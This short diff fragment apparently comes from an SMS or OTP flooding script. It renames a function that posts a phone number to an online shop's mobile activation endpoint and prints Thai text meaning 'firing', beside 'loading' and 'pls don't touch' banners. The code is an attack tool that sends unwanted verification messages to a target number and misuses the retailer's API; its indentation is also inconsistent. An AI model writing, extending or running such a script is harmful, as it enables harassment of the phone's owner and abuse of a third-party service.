@@ -23,7 +23,7 @@ print("____________For Minutes__________")
 print("☄️☄️☄️☄️☄️loading☄️☄️☄️☄️☄️")
 print("____________pls don't touch_____________")
 
-def test(): 
+def test1(): 
 	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
 		print("กำลังยิง")
 def test2():
